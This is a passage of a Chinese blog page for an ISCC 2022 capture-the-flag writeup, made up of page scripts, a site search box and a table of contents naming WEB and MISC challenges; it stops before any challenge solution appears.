<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.17.3"><title>ISCC 2022 Writeup</title><meta name="title" content="ISCC 2022 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/iscc-2022/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/iscc-2022/"><meta property="og:title" content="ISCC 2022 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/iscc-2022/"><meta property="twitter:title" content="ISCC 2022 Writeup"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
	// 防止暗色模式闪烁
	(function() {
		const theme = localStorage.getItem('theme');
		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
		
		if (theme === 'dark' || (!theme && systemPrefersDark)) {
			document.documentElement.classList.add('dark');
		} else {
			document.documentElement.classList.remove('dark');
		}
	})();
</script><script lang="js">
			// 动态导入 APlayer 并挂载到全局对象
			import('aplayer').then(function(APlayerModule) {
				window.APlayer = APlayerModule.default;
			});
		</script><link rel="stylesheet" href="/_astro/_slug_.DNYbVg5E.css">
<link rel="stylesheet" href="/_astro/waline.BpVnDCEn.css">
<link rel="stylesheet" href="/_astro/_slug_.N2UNtMs9.css">
<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media(max-width:1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media(max-width:768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a><a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a><a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a><a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a><a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端搜索和主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:flex items-center gap-3" data-astro-cid-3ef6ksr2> <button id="search-btn" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" title="搜索 (Ctrl+K)" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
(function() {
	function getSystemTheme() {
		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
	}

	function getCurrentTheme() {
		const saved = localStorage.getItem('theme');
		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
	}

	function applyTheme(theme) {
		document.documentElement.classList.toggle('dark', theme === 'dark');
	}

	function toggleTheme() {
		const isDark = document.documentElement.classList.contains('dark');
		const newTheme = isDark ? 'light' : 'dark';
		localStorage.setItem('theme', newTheme);
		applyTheme(newTheme);
	}

	function init() {
		applyTheme(getCurrentTheme());
		document.querySelectorAll('.theme-toggle').forEach(btn => {
			if (!btn.dataset.ready) {
				btn.addEventListener('click', toggleTheme);
				btn.dataset.ready = 'true';
			}
		});
	}

	init();

	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
		const saved = localStorage.getItem('theme');
		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
	});

	document.addEventListener('astro:page-load', init);
})();
</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div class="flex items-center gap-2" data-astro-cid-3ef6ksr2> <button id="search-btn-mobile" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
(function() {
	function getSystemTheme() {
		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
	}

	function getCurrentTheme() {
		const saved = localStorage.getItem('theme');
		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
	}

	function applyTheme(theme) {
		document.documentElement.classList.toggle('dark', theme === 'dark');
	}

	function toggleTheme() {
		const isDark = document.documentElement.classList.contains('dark');
		const newTheme = isDark ? 'light' : 'dark';
		localStorage.setItem('theme', newTheme);
		applyTheme(newTheme);
	}

	function init() {
		applyTheme(getCurrentTheme());
		document.querySelectorAll('.theme-toggle').forEach(btn => {
			if (!btn.dataset.ready) {
				btn.addEventListener('click', toggleTheme);
				btn.dataset.ready = 'true';
			}
		});
	}

	init();

	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
		const saved = localStorage.getItem('theme');
		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
	});

	document.addEventListener('astro:page-load', init);
})();
</script>  </div> </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Home </a><a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Blog </a><a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Links </a><a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Comment </a><a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),n=document.getElementById("menu");function i(){n?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单")}function d(){n?.classList.remove("hidden"),e?.classList.add("open"),e?.setAttribute("aria-expanded","true"),e?.setAttribute("aria-label","关闭菜单")}e&&n&&(e.addEventListener("click",()=>{e.classList.contains("open")?i():d()}),e.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())}),document.addEventListener("keydown",t=>{t.key==="Escape"&&e.classList.contains("open")&&(i(),e.focus())}),document.addEventListener("click",t=>{const s=t.target;!e.contains(s)&&!n.contains(s)&&i()}));const c=document.getElementById("search-btn"),a=document.getElementById("search-btn-mobile");function o(){typeof window.openSearchModal=="function"&&window.openSearchModal()}c&&c.addEventListener("click",o);a&&a.addEventListener("click",o);</script>  <!-- 搜索模态框 --><div id="search-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 dark:bg-black/70 backdrop-blur-sm" role="dialog" aria-modal="true" aria-labelledby="search-modal-title" data-astro-cid-qk3db3zz> <div class="relative w-full max-w-2xl mx-4 bg-white dark:bg-gray-800 rounded-2xl shadow-2xl transform transition-all" id="search-modal-content" data-astro-cid-qk3db3zz> <!-- 搜索框 --> <div class="p-4 border-b border-gray-200 dark:border-gray-700" data-astro-cid-qk3db3zz> <div class="relative" data-astro-cid-qk3db3zz> <input type="text" id="search-modal-input" placeholder="输入关键词搜索文章..." class="w-full px-4 py-3 pl-10 pr-10 text-base bg-gray-100 dark:bg-gray-700 rounded-xl border border-transparent
            placeholder:text-gray-400 dark:placeholder:text-gray-500
            focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500/50 focus:bg-white dark:focus:bg-gray-600
            focus:outline-none
            transition-all duration-200
            text-gray-900 dark:text-white" autocomplete="off" data-astro-cid-qk3db3zz> <div class="absolute left-3 top-1/2 -translate-y-1/2" data-astro-cid-qk3db3zz> <svg class="w-5 h-5 text-gray-400 dark:text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <button id="search-modal-close" class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 dark:text-gray-500 hover:text-gray-600 dark:hover:text-gray-300 transition-colors" aria-label="关闭搜索" data-astro-cid-qk3db3zz> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" data-astro-cid-qk3db3zz></path> </svg> </button> </div> </div> <!-- 搜索结果容器 --> <div class="max-h-[60vh] overflow-y-auto" data-astro-cid-qk3db3zz> <!-- 搜索结果 --> <div id="search-modal-results" class="p-4 space-y-3" data-astro-cid-qk3db3zz> <!-- 结果将在这里动态插入 --> </div> <!-- 空状态 --> <div id="search-modal-empty" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="mb-4" data-astro-cid-qk3db3zz> <svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <h3 class="text-base font-medium text-gray-900 dark:text-gray-100 mb-2" data-astro-cid-qk3db3zz>
未找到相关文章
</h3> <p class="text-sm text-gray-500 dark:text-gray-400" data-astro-cid-qk3db3zz>
试试其他关键词
</p> </div> <!-- 加载状态 --> <div id="search-modal-loading" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="inline-block animate-spin h-6 w-6 border-2 border-gray-400 dark:border-gray-500 border-t-transparent rounded-full" data-astro-cid-qk3db3zz></div> </div> </div> <!-- 快捷键提示 --> <div class="px-4 py-2 border-t border-gray-200 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400 flex items-center justify-between" data-astro-cid-qk3db3zz> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>Esc</kbd> 关闭</span> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>↑</kbd><kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs ml-1" data-astro-cid-qk3db3zz>↓</kbd> 导航</span> </div> </div> </div> <script type="module">let L=[],p=null,a=-1,h=[];const s=document.getElementById("search-modal");document.getElementById("search-modal-content");const i=document.getElementById("search-modal-input"),x=document.getElementById("search-modal-close"),c=document.getElementById("search-modal-results"),l=document.getElementById("search-modal-empty"),y=document.getElementById("search-modal-loading");async function b(){if(!(L.length>0))try{L=await(await fetch("/search.json")).json()}catch(e){console.error("加载搜索索引失败:",e)}}function u(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function k(e,t){if(!t.trim())return e;const n=new RegExp(`(${t.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")})`,"gi");return e.replace(n,'<mark class="bg-yellow-200 dark:bg-yellow-800/50 px-0.5 rounded">$1</mark>')}function M(e){if(!e.trim())return[];const t=e.toLowerCase(),n=[];for(const r of L){const d=r.title.toLowerCase().includes(t),m=r.content.toLowerCase().includes(t),g=r.categories.some(o=>o.toLowerCase().includes(t)),v=r.tags.some(o=>o.toLowerCase().includes(t));if(d||m||g||v){let o=0;d&&(o+=10),m&&(o+=1),g&&(o+=3),v&&(o+=3),n.push({...r,score:o})}}return n.sort((r,d)=>r.score!==d.score?(d.score||0)-(r.score||0):new Date(d.date).getTime()-new Date(r.date).getTime())}function T(e,t){if(!(!c||!l||!y)){if(y.classList.add("hidden"),a=-1,e.length===0){c.innerHTML="",l.classList.remove("hidden");return}l.classList.add("hidden"),c.innerHTML=e.map((n,r)=>{const d=k(u(n.title),t),m=k(u(n.excerpt),t),g=new Date(n.date).toLocaleDateString("zh-CN",{year:"numeric",month:"short",day:"numeric"});return`
        <a 
          href="${u(n.url)}" 
          class="block p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors search-result-item ${r===a?"bg-gray-100 dark:bg-gray-700":""}"
          data-index="${r}"
        >
          <h3 class="text-base font-semibold text-gray-900 dark:text-white mb-1">${d}</h3>
          <p class="text-sm text-gray-600 dark:text-gray-400 mb-2 line-clamp-1">${m}</p>
          <div class="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
            <time datetime="${n.date}">${g}</time>
            ${n.categories.length>0?`<span>·</span><span>${u(n.categories[0])}</span>`:""}
            ${n.tags.length>0?`<span>·</span><span>${u(n.tags[0])}</span>`:""}
          </div>
        </a>
      `}).join(""),w()}}function w(){c?.querySelectorAll(".search-result-item")?.forEach((t,n)=>{n===a?t.classList.add("bg-gray-100","dark:bg-gray-700"):t.classList.remove("bg-gray-100","dark:bg-gray-700")})}function I(){if(!i)return;const e=i.value.trim();if(p&&clearTimeout(p),e.length===0){c&&l&&(c.innerHTML="",l.classList.add("hidden"));return}y&&y.classList.remove("hidden"),p=setTimeout(()=>{h=M(e),T(h,e)},200)}function E(){!s||!i||(s.classList.remove("hidden"),s.classList.add("flex"),setTimeout(()=>{i.focus()},100),b(),document.body.style.overflow="hidden")}function f(){!s||!i||(s.classList.add("hidden"),s.classList.remove("flex"),i.value="",c&&l&&(c.innerHTML="",l.classList.add("hidden")),a=-1,h=[],document.body.style.overflow="")}function $(){!s||!i||!x||(s.addEventListener("click",e=>{e.target===s&&f()}),x.addEventListener("click",f),i.addEventListener("input",I),i.addEventListener("keydown",e=>{if(e.key==="Escape")e.preventDefault(),f();else if(e.key==="ArrowDown")e.preventDefault(),a<h.length-1&&(a++,w());else if(e.key==="ArrowUp")e.preventDefault(),a>0&&(a--,w());else if(e.key==="Enter"&&a>=0){e.preventDefault();const t=c?.querySelector(`[data-index="${a}"]`);t&&(window.location.href=t.href)}}),document.addEventListener("keydown",e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),s?.classList.contains("hidden")?E():f())}),window.openSearchModal=E)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",$):$();</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> ISCC 2022 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2022-06-06T14:41:18.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2022-06-06T14:41:18.000Z"> Jun 6, 2022 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 44 min read">44 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. WEB </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#冬奥会" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.1. 冬奥会 </a> </li><li data-astro-cid-woz2nwfv> <a href="#pop2020" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.2. Pop2020 </a> </li><li data-astro-cid-woz2nwfv> <a href="#easy-sql" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.3. Easy-SQL </a> </li><li data-astro-cid-woz2nwfv> <a href="#让我康康" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.4. 让我康康！ </a> </li><li data-astro-cid-woz2nwfv> <a href="#爱国敬业好青年-2" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.5. 爱国敬业好青年-2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#findme" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.6. findme </a> </li><li data-astro-cid-woz2nwfv> <a href="#这是一道代码审计题" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.7. 这是一道代码审计题 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2. MISC </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#单板小将苏翊鸣" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.1. 单板小将苏翊鸣 </a> </li><li data-astro-cid-woz2nwfv> <a href="#降维打击" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.2. 降维打击 </a> </li><li data-astro-cid-woz2nwfv> <a href="#藏在星空中的诗-1" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.3. 藏在星空中的诗-1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#真相只有一个" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.4. 真相只有一个 </a> </li><li data-astro-cid-woz2nwfv> <a href="#小光学ai" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" 